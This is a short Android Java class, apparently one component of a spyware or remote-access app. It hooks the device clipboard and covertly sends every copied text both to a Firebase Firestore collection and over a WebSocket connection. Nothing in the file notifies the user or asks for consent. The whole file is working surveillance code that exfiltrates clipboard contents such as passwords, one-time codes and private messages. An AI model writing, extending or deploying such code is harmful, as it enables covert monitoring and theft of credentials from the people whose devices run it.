package com.abm.fatakeshto;

import android.content.ClipboardManager;
import android.content.ClipData;
import com.google.firebase.firestore.FirebaseFirestore;
import java.util.HashMap;
import org.json.JSONObject;

public class ClipboardMonitor {
    private DeviceService service;
    private ClipboardManager clipboardManager;

    public ClipboardMonitor(DeviceService service) {
        this.service = service;
        clipboardManager = (ClipboardManager) service.getSystemService(Context.CLIPBOARD_SERVICE);
        clipboardManager.addPrimaryClipChangedListener(() -> {
            ClipData clip = clipboardManager.getPrimaryClip();
            if (clip != null && clip.getItemCount() > 0) {
                String text = clip.getItemAt(0).getText().toString();
                FirebaseFirestore.getInstance().collection("clipboard").add(new HashMap<String, Object>() {{
                    put("text", text);
                }});
                try {
                    JSONObject json = new JSONObject();
                    json.put("type", "clipboard");
                    json.put("data", text);
                    service.getWebSocketManager().sendMessage(json.toString());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }
}